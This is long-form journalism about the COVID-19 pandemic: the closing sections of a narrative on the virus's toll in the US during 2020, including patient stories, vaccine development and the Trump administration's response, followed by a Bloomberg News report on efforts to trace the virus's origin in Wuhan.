Moderna’s vaccine secured approval next. Its formulation proved to be 94.1 per cent effective in preventing infection and, so far, it has been a hundred per cent effective in preventing serious disease. Graham is happy that he chose to work with Moderna. In 2016, his lab developed a vaccine for Zika, a new virus that caused birth defects. His department did everything itself: “We developed the construct, we made the DNA, we did Phase I clinical trials, and then we developed the regulatory apparatus to take it into Central and South America and the Caribbean, to test it for efficacy.” The effort nearly broke the staff. Moderna was an ideal partner for the COVID project, Graham told me. Its messenger-RNA vector was far more potent than the DNA vaccine that Graham’s lab had been using.
In another major development, Eli Lilly recently received an Emergency Use Authorization for a monoclonal antibody that is also based on the spike protein that Graham and McLellan designed. It is similar to the treatment that President Trump received when he contracted COVID.
Graham had been in his home office, in Rockville, Maryland, when he got a call telling him that the Pfizer vaccine was breathtakingly effective—far better than could have been hoped for. “It was just hard to imagine,” he told me. He walked into the kitchen to share the news with his wife. Their son and grandchildren were visiting. “I told Cynthia, ‘It’s working.’ I could barely get the words out. Then I just had to go back into my study, because I had this major relief. All that had been built up over those ten months just came out.” He sat at his desk and wept. His family gathered around him. He hadn’t cried that hard since his father died.
Graham and his colleagues will not become rich from their creation: intellectual-property royalties will go to the federal government. Yet he feels amply rewarded. “Almost every aspect of my life has come together in this outbreak,” he told me. “The work on enhanced disease, the work on RSV structure, the work on coronavirus and pandemic preparedness, along with all the things I learned and experienced about racial issues in this country. It feels like some kind of destiny.”
More than a thousand health-care workers have died while taking care of COVID patients. Nurses are the most likely to perish, as they spend the most time with patients. On June 29th, Bellevue held a ceremony to memorialize lost comrades. Staff members gathered in a garden facing First Avenue to plant seven cherry trees in their honor.
As the coronavirus withdrew from Bellevue, it left perplexity behind. Why did death rates decline? Had face masks diminished the viral loads transmitted to infected people? Nate Link thinks that therapeutic treatments such as remdesivir have been helpful. Remdesivir cuts mortality by seventy per cent in patients on low levels of oxygen, though it has no impact on people on ventilators. Amit Uppal told me that the hospital has improved at managing COVID. “We now understand the potential courses of the disease,” he said. Doctors have become more skilled at assessing who requires a ventilator, who might be stabilized with oxygen, who needs blood-thinning medication. Then again, the main factor behind superior outcomes may be that patients now tend to be younger.
When a patient is discharged, the event offers a rare moment for the staff to celebrate. On August 4th, a beaming Chris Rogan, twenty-nine years old, was wheeled by his wife, Crystal, through a gantlet of cheering health-care workers, in scrubs and masks. There were balloons and bouquets. After so much death, a miracle had occurred.
Rogan was an account manager for a health-insurance firm in midtown. Crystal was a teaching assistant. In late March, he developed a low-grade fever and stomach discomfort, but he wasn’t coughing. His doctor said that he probably had the flu. Rogan grew increasingly lethargic. He developed pneumonia. An ambulance took him to Metropolitan Hospital, on the Upper East Side. He still felt O.K., even when his oxygen level fell to sixty-four per cent. An hour after he checked in, he couldn’t breathe. He was placed in a medically induced coma and intubated for nine days. During that time, the ventilator clogged and Rogan’s heart stopped for three minutes. When he was brought back to consciousness, a doctor asked, “Did you see anything while you were dead?”
“No,” Rogan said. “I don’t even remember being resuscitated.”
He began experiencing what hospital staffers told him was I.C.U. psychosis. He told Crystal that he’d been stabbed as a child. He began conversing with God. Just before he was intubated again, on April 15th, he felt certain that he would die in the hospital. He didn’t wake up for sixty-one days.
During that time, he was transferred to Bellevue, which was better equipped to handle him.
It’s a mistake to think that a patient in a coma is totally unaware. Rogan swam in and out of near-consciousness. When his doctor came in, he tried to talk to him: “Why am I awake? Why can’t I move?” He couldn’t sleep, because his eyes were partly open. “It’s like being buried alive,” he told me.
His tenth wedding anniversary passed. Sometimes he heard Crystal’s voice on video chat. “I hear you,” he’d say, but she couldn’t hear him. “I feel the tube down my throat, tell them to take me off the vent.” A machine kept pumping oxygen into his lungs: psht! psht! psht! The sound pounded in his head. He would dream that he had left the hospital, then wake to find himself still there, the ventilator pumping away. “It was fucking torture,” he said.
He developed internal bleeding. Clots formed in his legs. He told God that he didn’t want to die—that he had too much left to do. God assured him that he was going to make it.
Crystal was charged with making choices for Rogan’s care. The hardest one was the decision to amputate his right leg. It took three days to get him stable enough to perform the operation, which had to be done at his bedside, because he was too fragile to move. The doctors performed a guillotine amputation, just below the knee. Eight days later, they had to take off the knee.
Rogan doesn’t remember any of that. Some days, he is elated to be alive; other times, he asks himself, “What kind of quality of life is this?” Whether or not it was I.C.U. psychosis, he’s clung to the experience of talking with God.
When he emerged from the coma, he couldn’t move his arms, but now his right hand is functional. After several weeks of rehab, he can walk a bit with a prosthetic leg.
When he fell ill, there were only a hundred and fifty thousand cases in the U.S. When he left the hospital, there were more than four million.
The death toll kept mounting, surpassing three hundred thousand at year’s end. Some victims were famous. The playwright [Terrence McNally]( was one of the first. The virus also killed Charley Pride, the first Black singer in the Country Music Hall of Fame, and Tom Seaver, one of the greatest pitchers in baseball history. Eighty per cent of fatalities have been in people aged sixty-five or older, and most victims are male. It’s been strange to find myself in the vulnerable population. I’m a year younger than Trump, so his adventure with COVID was of considerable interest to me. If I get ill, I’m not likely to receive the kind of treatment the President did, but I’m in better physical condition, despite a bout of cancer. My wife, though, has compromised lungs. Even before the coronavirus put a target on our age group, mortality was much on my mind. Sometimes I’m dumbstruck by how long I’ve lived; when I’m filling out a form on the Internet, and I come to a drop-down menu for year of birth, the years fly by, past the loss of parents and friends, past wars and assassinations, past Presidential Administrations.
On September 9th, our grandchild Gioia was born. She is the dearest creature. We stare into each other’s eyes in wonder. Even in this intimate moment, though, the menace of contagion is present: we are more likely to infect the people we love than anyone else. Deborah Birx has recalled that, in 1918, her grandmother, aged eleven, brought the flu home from school to her mother, who died of it. “I can tell you, my grandmother lived with that for eighty-eight years,” she said.
Even before [the election]( Matt and Yen Pottinger had decided that they were tired of Washington. He was burned out on the task force, which had drifted into irrelevance as the Administration embraced magical thinking. They drove west, looking for a new place to live, and settled on a ski town in Utah. Matt will join Yen there once he wraps up his job in Washington.
Pottinger’s White House experience has made him acutely aware of what he calls “the fading art of leadership.” It’s not a failure of one party or another; it’s more of a generational decline of good judgment. “The élites think it’s all about expertise,” he said. It’s important to have experts, but they aren’t always right: they can be “hampered by their own orthodoxies, their own egos, their own narrow approach to the world.” Pottinger went on, “You need broad-minded leaders who know how to hold people accountable, who know how to delegate, who know a good chain of command, and know how to make hard judgments.”
At the end of October, before returning to D.C., Pottinger went on a trail ride in the Wasatch Range. As it happened, Birx was in Salt Lake City. Utah had just hit a record number of new cases. On the ride, an alarm sounded on Pottinger’s cell phone in the saddlebag. It was an alert: “Almost every single county is a high transmission area. Hospitals are nearly overwhelmed. By public health order, masks are required in high transmission areas.”
Pottinger said to himself, “Debi must have met with the governor.”
Covid has been hard on Little Africa. “Some of our church members have passed, and quite a few of our friends,” Mary Hilton, Ebony’s mother, told me recently. “We just buried one yesterday. They’re dropping everywhere. It’s so scary.” A cousin is in the hospital.
“One out of eight hundred Black Americans who were alive in January is now dead,” Hilton told me. “There would be another twenty thousand alive if they died at the same rate as Caucasians.” She added, “If I can just get my immediate family through this year alive, we will have succeeded.” She and two colleagues have written a letter to the Congressional Black Caucus proposing the creation of a federal Department of Equity, to address the practices that have led to such disparate health outcomes.
Infected people keep showing up at U.Va.’s hospital at a dismaying pace. Hilton recently attended the hospital’s first lung transplant for a COVID patient. He survived. Lately, more young people, including children, have populated the COVID wards. Hospitals and clinics all over the country have been struggling financially, and many health-care workers, including Hilton, have taken pay cuts.
Thanksgiving in Little Africa is usually a giant family reunion. Everyone comes home. There’s one street where practically every house belongs to someone in Hilton’s family; people eat turkey in one house and dessert in another. Hilton hasn’t seen her family for ten months. She spent Thanksgiving alone in Charlottesville, with her dogs.
Thanksgiving was Deborah Birx’s first day off in months. She and her husband have a house in Washington, D.C., and her daughter’s family lives in nearby Potomac, Maryland. During the pandemic, they have been a pod. Recently, Birx bought another house, in Delaware, and after Thanksgiving she, her husband, and her daughter’s family spent the weekend there.
Her access to the President had been cut off since the summer, and, with that, her ability to influence policy. She had become a lightning rod for the Administration’s policies. Then, in December, a news report revealed that she had travelled over the Thanksgiving weekend, counter to the C.D.C.’s recommendation. She was plunged into a cold bath of Schadenfreude. Old photographs resurfaced online, making it look as if she were currently attending Christmas parties.
Birx indicated that she might soon leave government service.
20. Surrender
Austin bills itself as the “Live Music Capital of the World,” but the bars and dance halls are largely closed. Threadgill’s, the roadhouse where Janis Joplin got her start, is being torn down. The clubs on Sixth Street, Austin’s answer to Bourbon Street, haven’t been open for months. A band I play in has performed in many of them, but for the past several years we had a regular gig at the Skylark Lounge, a shack tucked behind an auto-body shop. Johnny LaTouf runs the place with his ex-wife, Mary. It’s been shut since March 15th.
“All small businesses have been affected, but music venues around the country were already in a struggle,” Johnny told me. He’s had to let go his ten employees—including three family members. That’s only part of the damage. “When the musicians get laid off and the bands disperse and go their separate ways, then you’ve actually broken up their business.” He added, “COVID killed off more than people with preëxisting conditions. Lots of businesses have preëxisting conditions.”
Lavelle White, born in 1929, was still singing the blues at Skylark until the doors closed. “Some of our greater musicians are older, because it takes a lifetime to master the craft,” Johnny said. Skylark was a mixing bowl where younger musicians learned from their elders. “Now that pathway is broken.”
When Congress passed the CARES Act, which included money to support small businesses, local bars were not a priority. “There’s no money,” Johnny said Wells Fargo told him. He helps several older musicians with groceries, but he doesn’t know how many in that crowd will ever return. Some have died from COVID.
Two qualities determine success or failure in dealing with the COVID contagion. One is experience. Some places that had been seared by past diseases applied those lessons to the current pandemic. Vietnam, Taiwan, and Hong Kong had been touched by sars. Saudi Arabia has done better than many countries, perhaps because of its history with mers (and the fact that many women routinely wear facial coverings). Africa has a surprisingly low infection rate. The continent’s younger demographic has helped, but it is also likely that South Africa’s experience with H.I.V./AIDS, and the struggle of other African countries with Ebola, have schooled the continent in the mortal danger of ignoring medical advice.
The other quality is leadership. Nations and states that have done relatively well during this crisis have been led by strong, compassionate, decisive leaders who speak candidly with their constituents. In Vermont, Governor Phil Scott, a Republican, closed the state early, and reopened cautiously, keeping the number of cases and the death toll low. “This should be the model for the country,” Fauci told state leaders, in September. If the national fatality rate were the same as Vermont’s, some two hundred and fifty thousand Americans would still be alive. Granted, Vermont has fewer than a million people, but so does South Dakota, which was topping a thousand cases a day in November. Scott ordered a statewide shutdown in March, which caused an immediate economic contraction. Governor Noem opposed mandates of any sort, betting that South Dakotans would act in their best interests while keeping the economy afloat. Vermont’s economy has recovered, with an unemployment rate of 3.2 per cent—nearly the same as South Dakota’s. But South Dakota has seen twelve times as many deaths.
In Michigan, the state’s chief medical officer, Joneigh Khaldun, is a Black emergency-room doctor. “She was one of the first to look at the demographics of COVID and highlight that we have a real racial disparity here,” Governor Whitmer told me. “Fourteen per cent of our population is Black, as were forty per cent of the early deaths.” The state launched an aggressive outreach to Black communities. By August, the rates of both cases and fatalities for Blacks were the same as—or lower than—those for whites. The vast differences in outcomes among the states underscore the absence of a national plan. The U.S. accounts for a fifth of the world’s COVID deaths, despite having only four per cent of the population.
In August, the Pew Research Center [surveyed]( people from fourteen advanced countries to see how they viewed the world during the pandemic. Ninety-five per cent of Danish respondents said that their country had handled the crisis capably. In Australia, the figure was ninety-four per cent. The U.S. and the U.K. were the only countries where a majority believed otherwise. In Denmark, seventy-two per cent said that the country has become more unified since the contagion emerged. Eighteen per cent of Americans felt this way.
On March 16th, Trump issued nationwide guidelines for closing schools, shutting down bars and restaurants, and limiting unnecessary travel and social gatherings. But that day marked a turning point. In his conversation with governors, he abandoned any effort to coalesce a national plan, and his Administration began undercutting governors’ attempts to acquire P.P.E. Then, on April 3rd, Trump undermined the C.D.C.’s guidance on wearing masks: “You don’t have to do it. I’m choosing not to do it. But some people may want to do it.”
Trump, by his words and his example, became not a leader but a saboteur. He subverted his health agencies by installing political operatives who meddled with the science and suppressed the truth. His crowded, unmasked political rallies were reckless acts of effrontery. In his Tulsa speech, he said that he’d asked his health officials to “slow the testing down”—impeding data collection just to make his Administration look better. When the inevitable happened, and he contracted the disease, he almost certainly spread it. Every guest at the Barrett reception tested negative for the virus before entering. Trump may well have been the superspreader at the Rose Garden event.
The President could have tried to bring the country together. In the press conference where he said that he wouldn’t wear a mask, he praised the efforts of the Democratic governors of New York and New Jersey; he expressed sympathy for Michiganders, who were “getting hit very, very hard.” He announced federal efforts to aid New York City. “America is engaged in a historic battle to safeguard the lives of our citizens,” he said. “Our greatest weapon is the discipline and determination of every citizen to stay at home and stay healthy.” The man who said those words might have been the President the country needed. But he was not that man.
He campaigned against Biden, but mainly he campaigned against the disease. “When the year started, he appeared unbeatable,” Senator Lee told me. “My Democratic colleagues were discouraged about their chances. By the end of the impeachment trial, when we began hearing about the virus, we were not sure it would be a big deal. But it put an end to one of the things the President is best at—those big rallies.” When Trump finally resumed them, defying medical advice, his fury was volcanic. “People are tired of hearing Fauci and all these idiots,” he grumbled on October 19th, when the number of new cases exceeded sixty-five thousand. “COVID, COVID, COVID, COVID, COVID, COVID!” he said at a rally in North Carolina, five days later. “We’re doing great. Our numbers are incredible.” That day, nearly eighty thousand new cases were reported, overshadowing the highest levels of the summer. In Omaha, on October 27th, he said of COVID, “I’m here, right? . . . I had it.” Hospitalizations were up forty-six per cent that month. He ignored the fever sweeping through the Mountain West and the Great Plains—Trump country. His slogan was both cynical and fatuous: “If I can get better, anybody can get better.”
Infections often rose in counties where Trump held a rally. The surge in infections and deaths mocked his assertions that we were “rounding the turn.” The disease stalked him; it encircled him. On October 25th, Trump’s chief of staff, Mark Meadows, declared, “We are not going to control the pandemic.” The Administration had given up.
COVID couldn’t kill Donald Trump, but it could defeat him.
Five days before the election, Biden spoke at a drive-in rally in Tampa. “So much suffering, so much loss,” he said. “Donald Trump has waved the white flag, abandoned our families, and surrendered to the virus.” Honking cars punctuated his remarks. That day, new confirmed cases topped ninety thousand.
The next day, Fauci said, “All the stars are aligned in the wrong place as you go into the fall and winter season, with people congregating at home indoors. You could not possibly be positioned more poorly.”
Halloween night in Austin was beautiful, graced with a blue moon. My wife and I set out a bowl of chocolate bars and Dum Dums, but there were scarcely any trick-or-treaters. As dusk settled over the city, when our neighborhood would normally be filled with fairies and vampires, a deer galloped down the street.
21. “GET HERE NOW”
America is full of strivers whose dreams seem just out of reach. Iris Meda was one of them. She had a big smile but sad eyes. She grew up in Harlem, the oldest of six children. Her mother was a domestic who was home only one day a week; her stepfather was a longshoreman. Meda’s first bed was an ironing board.

For most of her childhood, she was the family caretaker, walking her siblings to school before she went herself. Like many of her high-school friends, she dropped out after a bout of depression. She married and had two daughters. Meda eventually got a G.E.D. and surprised herself by graduating at the top of her class from Bronx Community College. In 1984, she earned a nursing degree from City College. Medicine fascinated her. She would go home and talk about watching a surgeon massage a patient’s heart. She was drawn to those who were wounded or hurting—people who felt that the world wasn’t big enough for them. For years, she was a nurse at the Rikers Island jail. She cared about the prisoners, and they knew it. When her husband was transferred to Dallas, she gave notice, and on her last day the inmates clapped her out. “She was always looking for an underdog to pull up, because she was an underdog,” her daughter, Selene Meda-Schlamel, said.
Meda retired in January, after two years in the North Texas Job Corps. She had been in charge of on-site care, meaning that she was on call nights and weekends, and when she turned seventy she decided that she’d had enough. She and Selene had big plans. Meda wanted to travel; she wanted to ride in a convertible for the first time; she talked about writing a book. “In March, it all came to a screeching halt,” Selene told me. Her mother was still a proud New Yorker, so she spent a lot of time in front of the TV watching Dr. Fauci and Governor Cuomo. “Her knowledge of science kept her ahead of the news reports,” Selene said. Meda, having worked in nursing homes, hospitals, and jails, knew that COVID would be devastating for people who were confined, and for those who took care of them.
Meda couldn’t stand being idle during the crisis. “She wanted to teach,” Selene said. “She wanted to encourage younger nurses to continue their education. She wanted them to reach their full potential in a way she almost didn’t.” Meda successfully applied for a job at Collin College, in Allen, Texas. At the time, courses were being offered virtually, and Meda imagined that she would be teaching online in the fall. When the semester began, she learned that many classes were in-person. [According to the local NPR station]( the college’s president, H. Neil Matkin, had made his views of the virus known in an e-mail to trustees: “The effects of this pandemic have been blown utterly out of proportion across our nation.”
Meda hoped to be in a large classroom where students could be widely spaced, but she was assigned to teach a lab for a nurse’s-aide course. There was no social distancing. On October 2nd, a student was coughing and sneezing, complaining of allergies. That day, Trump announced that he had COVID. Meda was repulsed when he insisted on taking a car ride to wave at his supporters outside the hospital, with Secret Service agents in the car with him. Meda texted Selene, “He’s putting all those people at risk just for a photo.”
On October 7th, Meda learned that the student had tested positive. The college chose to continue in-person classes even after one student died. By this time, Trump was out of the hospital, saying he felt “better than twenty years ago.”
Meda became feverish on October 12th. Two days later, she tested positive and went to the E.R., but her oxygen level was not low enough for her to be admitted. On October 17th, Selene took her mom back to the hospital. Meda was seriously ill, but the staff, worried about COVID, kept her waiting outside, slumped over on a bench in the E.R. drive-through. When the triage nurse finally waved Meda in, Selene wasn’t permitted to join her, because she had been exposed. Meda’s oxygen level was now so low that she couldn’t speak. Selene didn’t see her again for thirty days.
During that period, Meda was able to speak only once on the phone. Most days, she texted with Selene. One day, she asked Selene to call a nurse who she thought was doing an excellent job. “She’s having a hard day,” Meda texted. She worried about her students and wondered if anyone else had caught the virus. (None showed symptoms.)
The disease progressed inexorably. Selene could tell that doctors were doing everything they could, but her mother’s lungs wouldn’t rebound. Selene wondered if things would be turning out differently had her mother received treatment earlier.
On November 14th, Selene got a call advising that her mother’s blood pressure was plummeting. “Based on how she’s declining, how long do we have?” Selene asked, thinking that she would pick up her father, so that he could say goodbye. “A couple hours,” the doctor said. Ten minutes later, a nurse called and said, “Get here now.”
“They put me in a helmet,” Selene recalled. “There was a plastic flap that closed around my neck. Inside the helmet there was a fan at the top that blew air down, so that any air that got in would be flushed away. And they put a gown on me, and double gloves, and they let me go in and say goodbye to her. That was the biggest shock, to see her, and to see how she looked. She was twice her size, because she was swollen from steroids. Her tongue was swollen and hanging out the side of her mouth because she was on the ventilator—she’d been intubated. They had to brace her head to keep it straight on the pillow, and they had tape around her mouth to keep the tube in. I’ll never forget it. But I think the thing that will haunt me is the smell. It’s like the smell of decay, like she had already started to die.
“The thing that made it so hard to see that was to juxtapose it against President Trump out there, saying he felt like he was twenty-eight years old again and he never felt better. So how could the same thing that did this to her, how could someone ever take it for granted that this was nothing, you have nothing to be afraid of?”
Selene gathered her mother in her arms as the machines went silent.
My wife and I voted early, in a drop-off location in Travis County, where ninety-seven per cent of eligible voters were registered. It was a new way of voting—swift, efficient, and rather exhilarating. And yet the vote came amid a crescendo of bad news. The week before November 3rd, the country added half a million new COVID cases, reaching record highs in half the states. The stock market had its worst week since the swan dive in March. Eight million Americans had fallen into poverty since the summer. At least five members of Vice-President Pence’s staff had been infected with COVID, as the virus continued to roam the White House.
In Texas, as in many Republican states, there were naked attempts to suppress the vote. Governor Abbott restricted the number of drop-off sites to one per county, including in Harris County, which has more than four million people. The attorney general, Ken Paxton, went to court to block the enforcement of a mask requirement at the polls, endangering voters as well as poll workers, who tend to be older. For the election, Abbott readied a thousand National Guard troops in major Texas cities, in anticipation of violence. Store owners in Dallas boarded up their windows, like beach communities awaiting a hurricane.
But there was no violence in Texas on Election Day. Voting is a simple act, and an act of faith. It is a pledge of allegiance to the future of the country. Across America, people waited in long lines to vote—despite the disease, despite attempts to discredit or invalidate their vote, despite postal delays, despite Russian or Iranian meddling, despite warnings from the White House that the President would not go quietly if he lost. They voted as if their country depended on it. ♦

China Is Making It Harder to Solve the Mystery of How Covid Began
Investigators may never know how Covid-19 emerged in the country — and how to stop it from happening again.
Bloomberg News
December 30, 2020, 4:00 PM EST
In the year since seafood hawkers started appearing at Wuhan’s hospitals sickened with a strange and debilitating pneumonia, the world has learned a lot about Covid-19, from the way it spreads to how to [inoculate]( against the infection. Despite these advances, a chasm remains in our understanding of the virus that’s killed nearly 2 million people and [whipsawed]( the global economy: we still don’t know how it began.
Where the pathogen first emerged and how it transmitted to humans is a stubborn mystery, one that’s becoming more elusive with each passing month. Before the initial cluster among stall-holders at a produce market in central China, the trail largely goes cold, and the country the novel coronavirus hit first — the place many blame for unleashing the disease on an under-prepared world — now has little incentive to help find the true origin of the greatest public health emergency in a century.
China has effectively snuffed out Covid-19, thanks to stringent border curbs, [mass testing]( and a surveillance network that allows infected people and their contacts to be tracked via mobile phone data. With the fight over the pandemic’s source becoming an extension of the broader conflict between the world’s two superpowers, China is now trying to revise the virus narrative from the beginning, and nowhere is that more evident than at the original epicenter: Wuhan.
Images of first responders dwarf the entrance to the city’s bright red exhibition hall like heroes from Maoist-era propaganda posters: the police officer, the doctor, the soldier; their faces obscured by masks. Inside, a giant photo of a nurse’s hands, inflamed and peeling, hangs over an army of mannequins in Hazmat suits. A 3D hologram of medics tending to a critical coronavirus patient is beamed over a real-life hospital bed, the beeps of a heart-rate monitor creating a sense of drama not lost on the college students shuffling past transfixed. Nearby, testing kits are sealed in clear display cases, labeled like artifacts from another time.
As the world continues to grapple with soaring death counts and mutated strains, China is already relegating the pandemic to its version of history.
The Battle Against Covid-19 Special Exhibition seeks to memorialize everything from mask-making machines and 2,000-bed temporary hospitals to lockdown haircuts and remote learning. A timeline at the entrance to the exhibit chronicles President Xi Jinping’s virus actions in careful detail, starting on Jan. 7, when he ordered the country’s leaders to contain the rapidly swelling outbreak and ending in September, when Xi gave a speech to bureaucrats in Beijing on how China tamed the coronavirus.
There’s no mention of the Huanan seafood market, those first infections, or the public uproar over the government’s [cover-ups]( in the early days of the epidemic, when it hid the extent of human-to-human transmission and delayed taking action. Li Wenliang, the whistleblower doctor whose death from Covid-19 sparked the [biggest backlash]( Beijing had seen in years, appears in a lineup of other Wuhan physicians felled by the virus, barely noticeable. For many Chinese, that anger has been replaced with a sense of pride, that their country bested a crisis that’s all but defeated the U.S., leaving China stronger and on track — by at least one consultancy’s estimate - to become the world’s biggest economy [five years earlier]( than previously predicted.
With the virus firmly contained — Wuhan has had no locally-transmitted cases since May — there’s a growing push to dispel the idea that China was the ultimate source of the virus, known officially as SARS-CoV-2. A foreign ministry spokesman has been espousing theories that link the virus to the U.S. military, and after a spate of cases in Chinese port and cold storage workers, state-backed media are claiming the virus could have entered the country on [imported frozen food]( They’ve also seized on research that suggests there were infections in the U.S. and [Italy]( that pre-date those in Wuhan.
While some of these theories may have credence, the irony is that we may never know how and where the virus emerged. China has ignored appeals for an independent investigation into the virus’s origin, hammering Australia with trade restrictions after it called for one. It’s also stalled efforts by the World Health Organization to get top infectious diseases experts into Wuhan this year. That’s prevented the painstaking epidemiological detective work — from probing samples of [the city’s wastewater]( to checking patient specimens collected months before the outbreak appeared for early traces of the pathogen and undertaking tests at the food market itself — that could provide insight into the chain of events that brought the virus to the bustling capital of Hubei province, and how to stop it from happening again.
Now, with a WHO team focused on tracing the virus’s origin hoping to visit Wuhan in January, and a crew commissioned by [The Lancet]( medical journal also on the hunt, the city may not have much to reveal. Life is largely back to normal for Wuhan’s 11 million people, the first to experience the [lockdowns]( now shuttering parts of Europe and North America for a second time.
“These things are awfully hard to do retrospectively, even if all the evidence is still in place,” said Robert Schooley, an infectious-diseases physician at the University of California, San Diego and editor-in-chief of the journal Clinical Infectious Diseases.
Located just 5 miles south of the exhibition center, the Huanan seafood market is partitioned off by eight-foot-high metal barricades, replete with pictures of tranquil rural scenes — bolted to the ground. Potted palm trees dot the perimeter of the multi-story building, site of the world’s first known cluster of Covid-19. Until government cleaners swooped in in late 2019, to close, vacate and sanitize dozens of stalls, it was a key source of produce for locals and restaurants in central Wuhan. It was also [reported]( by media including Agence France Presse to have sold a range of wild animals and their meat, from koalas and wolf pups to rats and palm civets, the cat-like animals suspected of being the conduit of the SARS virus between bats and humans, which led to a deadly outbreak in China in 2002 that subsequently spread to other parts of the world.
Now only eyeglass vendors line the sparsely filled aisles on Huanan’s second floor, their diminished clientele carefully vetted by security guards. On a recent visit to the market, Bloomberg News reporters were warned away by plain-clothes officials and later, police.

Beyond the carefully constructed museum exhibits, few other signs of Wuhan’s epic battle with the coronavirus exist. A makeshift hospital famously built in about two weeks to treat thousands of critical patients has been shut down and boarded up. Two local women said they’d heard the site would be turned into apartments.
[Wuhan Beat the Virus. Now It’s Moving on by Shutting Out the World.](
In Wuhan Tiandi, a shopping precinct that claims to have China’s first [outdoor food street]( with air conditioning, couples and families rugged up against the winter chill casually remove their face masks to eat and chat. When asked about the origins of the virus, most said it didn’t start in the city.
For all of China’s stonewalling, scientists suspect they could well be right.
The place a virus first infects a human isn’t necessarily where it begins spreading efficiently among people, said [Joel Wertheim]( an associate professor of medicine at the University of California, San Diego, where he studies the evolution and epidemiology of infectious diseases. HIV, for instance, is thought to have originated in chimpanzees in southeastern Cameroon, but didn’t begin spreading readily in people until it reached the city of Kinshasa, hundreds of miles away.
While researchers surmised early on that the [horseshoe bat]( identified as the likely source of SARS could also have spawned SARS-CoV-2, how it crossed the species barrier to infect humans remains unclear. It’s likely that precursors to this virus spilled over from their natural reservoir many times, but went extinct when infected individuals didn’t transmit the virus to anyone, according to Wertheim. Eventually, the virus infected someone who passed it to multiple people, who also passed it on to others.
“You could have sort of these one-off, dead-end transmission chains until you get into Hubei province, which is where the epidemiological data says this is where it was spreading,” Wertheim said. “And it seems to have seeded the rest of China from there, and then from China to the rest of the world.”
Chinese scientists published the genetic sequence of the virus in January, a move that has allowed experts elsewhere to make some inroads into how this may have started. Wertheim and his colleagues studied SARS-CoV-2 virus genomes and the pace at which they mutated and diversified from the earliest known specimens in Wuhan. From mid-October to mid-November 2019 is the most plausible period in which the first case in people emerged, according to a pre-print of [Wertheim’s research]( released Nov. 24.
The question of how the pathogen got to central China is the subject of more debate. The coronaviruses most closely related to SARS-CoV-2 were found in bats in China’s Yunnan province, some 1,000 miles southwest of Wuhan. The mountainous region borders Vietnam, Laos and Myanmar, all countries known to have sizable horseshoe bat populations.
“We can’t rule out that the person who first got this virus was in Yunnan and then infected another person who hopped on a plane and went back to Wuhan after their vacation,” said [Michael Worobey]( head of ecology and evolutionary biology at the University of Arizona in Tucson, who worked with Wertheim on the timing of the first possible case.
Other scientists see a potential answer in outbreaks half a world away. Over the past few months, SARS-CoV-2 has exploded among mink populations in Europe and North America after the virus was introduced by infected humans, with which they share some respiratory-tract features. Millions of the semi-aquatic, carnivorous mammals, reared for their soft pelts, have been culled to purge the pathogen from farms where they have been linked to [mutations]( in the coronavirus that some scientists said could pose a threat to vaccine efficacy.
“The mink scenario to me says, where you’ve got a large population of susceptible animals in the right conditions with a certain density, then this virus is just going to go right through it,” said Hume Field, an Australian wildlife epidemiologist who worked on the international probe that linked SARS to horseshoe bats and is a member of The Lancet’s Covid-19 origins task force.
Field discovered the source of a deadly virus that killed horses and their handlers in eastern Australia more than 20 years ago. After an exhaustive search, he eventually found Hendra virus originated in large fruit bats, known locally as flying foxes. The finding led scientists to understand what veritable [virus treasure troves]( bats are. Besides his investigation into the origins of Hendra and SARS, Field has also helped trace the Nipah and Ebola Reston viruses back to bats.
Did SARS-CoV-2 jump directly from bats to humans, or did it spread to another animal — a so-called intermediate host — that then passed it on to people? Finding out is key to reducing the risk of secondary outbreaks and the emergence of new strains impervious to the [Covid-19 vaccines]( now being rolled out around the world. The virus’s affinity with mink suggests wild animals from the same “mustelid” family, which includes weasels and ferrets, that interacted with coronavirus-carrying bats may have played an intermediary role, according to Field.
Mink resemble “a microcosm of what could have happened prior to Covid,” said [Peter Daszak]( a New York-based zoologist who is part of both the WHO and The Lancet teams trying to trace the virus’s origins. He theorizes that the virus went from horseshoe bats to people in Wuhan via wildlife that were sold in the city or people connected with that trade. In the wake of the outbreak, China said it[curtailed]( the sale and consumption of wild animals, but the trade is difficult to police given how integral it is to cuisine and traditional medicines, particularly in the south.
Since bats don’t fly regularly from southern China to Wuhan, it’s more likely the virus was propagated in civets or other susceptible animals raised on farms for sale in the Huanan market, Daszak said. In the wild, coronaviruses spread across animal species via the fecal-oral route, such as when a civet eats fruit contaminated by bat droppings.
“We still don’t really know what animals were present in that market in the beginning,” he said. “It’s quite possible there are other animals in China that were infected.”
Finding out more from those who were there will be difficult, especially a year on. Scientists still don’t know the precise source of the Ebola virus, for example, nor how the [H1N1 influenza virus]( that swept the world in 2009 jumped from pigs into people. It’s possible the origin of Covid-19 will never be found, George Gao, the director of China’s Center for Disease Control and Prevention, [told]( the Xinhua news agency this week. “We looked for suspect animals in Wuhan, but found none.”
After the Huanan market was closed, some of its stallholders were relocated to the cavernous Sijimei food market on Wuhan’s northern outskirts. On a frigid day in mid-December, it was almost deserted of customers, but few vendors were willing to speak to Bloomberg about the events that took place 12 months earlier. A spice and condiment seller who said his family name was Xie, confirmed he’d moved from Huanan in March, but said he couldn’t remember anything that happened there. Shortly after, security guards appeared saying that foreign media were barred from filming.
The response was similar at a nearby open-air market, where other Huanan vendors had set up stalls. An attendant selling lamb carcasses confirmed the business moved there in March before he was told to shut up by his manager. Moments later, two guards appeared, saying any interviews should be cleared by the Communist Party.
Bloomberg has made multiple requests over the course of 2020 to interview key Chinese scientists, including both the director and chief epidemiologist at the country’s CDC, and the nation’s most experienced coronavirus expert, Shi Zhengli.
Shi — known as China’s “bat woman” for her intrepid, decade-long exploration and collection of viruses in bat-festooned caves — has been at the center of speculation about the source of SARS-CoV-2 since its first weeks. She operates a laboratory at the Wuhan Institute of Virology that studies some of the planet’s worst infectious disease threats. Its location in a peri-urban industrial area about 20 miles from the Huanan market has fueled theories that the virus either accidentally escaped from the lab or, more sinister, that it was genetically engineered and deliberately released.
Shi has said the genetic characteristics of the viruses she’s worked on [don’t match]( SARS-CoV-2 and told the state-run China Daily newspaper in early February that she was willing to [“bet my life”]( that the outbreak had “nothing to do with the lab.” Shi is also open to [“any kind of visit”]( to rule it out, the BBC reported Dec. 22.
